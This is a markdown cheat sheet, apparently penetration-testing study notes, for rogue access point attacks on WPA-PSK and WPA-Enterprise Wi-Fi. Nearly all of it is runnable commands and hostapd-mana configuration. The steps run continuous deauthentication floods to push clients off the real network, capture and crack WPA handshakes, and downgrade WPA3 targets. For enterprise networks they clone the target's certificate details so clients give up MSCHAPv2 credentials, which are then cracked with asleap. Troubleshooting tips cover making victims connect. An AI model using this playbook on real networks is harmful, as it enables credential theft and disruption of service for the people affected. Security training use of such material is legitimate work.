# Rogue AP Attacks (WPA-PSK & WPA-MGT)
Match the target **ESSID / channel / band / cipher** so clients accept / prefer you

## Recon (both)
```sh
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan1
$ sudo airodump-ng --band abg wlan1mon
```

## WPA-PSK rogue (capture a half/full handshake)
`mana.conf`:
```
interface=wlan0
ssid=<ESSID>
channel=<CH>
hw_mode=g                    # 'a' for 5GHz
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD   # irrelevant
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/user/out.hccapx
```

```sh
$ sudo hostapd-mana mana.conf                 # LEAVE RUNNING
# kick clients off
$ sudo airmon-ng start wlan1 <CH> # channel is important! Otherwise if you forget: sudo iw dev wlan1mon set channel 44
$ sudo aireplay-ng -0 0 -a <REAL_BSSID> wlan1mon
$ sed 's/^\[WPA2-EAPOL HASHCAT\][[:space:]]*//' out.hccapx > out.22000
$ hashcat out.22000 /usr/share/john/password.lst          # or aircrack-ng
```
WPA3 target - downgrade: `wpa=2`, remove `wpa_pairwise`, `rsn_pairwise=CCMP`, add `ieee80211w=1`, add `WPA-PSK-SHA256` to `wpa_key_mgmt`.

## WPA-MGT rogue (steal EAP creds)
```sh
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan1
$ sudo airodump-ng -w discovery --output-format pcap wlan1mon
$ sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon # if not getting data, kick clients
```

```sh
$ tshark -r discovery-01.cap -Y "eap && tls.handshake.certificate" -V | grep rdnSequence: -A1 # get certificate info
$ cd /etc/freeradius/3.0/certs
$ sudo nano ca.cnf
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = ca@playtronics.com
commonName              = "Playtronics Certificate Authority"

$ sudo nano server.cnf
[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = admin@playtronics.com
commonName              = "Playtronics"

$ rm dh
$ make # client.crt error at the end is OK
```

```sh
$ sudo nano /etc/hostapd-mana/mana.conf
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211
# ieee80211n=1 # !!! NOT NEEDED I THINK !!!

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1 # !!! SET THIS !!!
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g # !!! SET THIS !!!

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1

$ cat /etc/hostapd-mana/mana.eap_user
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]

$ sudo hostapd-mana /etc/hostapd-mana/mana.conf
$ sudo iw dev wlan1mon set channel <CH>
$ sudo aireplay-ng -0 0 -a <REAL_BSSID> wlan1mon          # 2nd card, same CH/band
# captures: MANA EAP ... EAP-MSCHAPV2 lines (also /tmp/hostapd.credout). NOTE THE DOMAIN.
$ asleap -C <challenge> -R <response> -W /usr/share/john/password.lst
```

## Troubleshooting
- hostapd-mana TLS init fails / won't start: a cert path is missing. `make` silently skips `server.crt`/`server.pem` when `ca.cnf` and `server.cnf` **country/state/organizationName** don't match exactly (case & spaces). Rebuild: `make destroycerts; make`.
- DH too small: delete `dh`, regenerate 2048: `openssl dhparam -out dh -2 2048`
- Cert expired (60-day default): `openssl x509 -in CERT -noout -enddate` and regenerate
- Client won't accept cert (`SSL ... unknown CA`): clone must match the real cert, or use a CA with a similar-sounding domain
- clients don't connect: our signal must beat the real AP. Otherwise kick them off the real AP. Won't work if the client is locked down or 802.11w is on
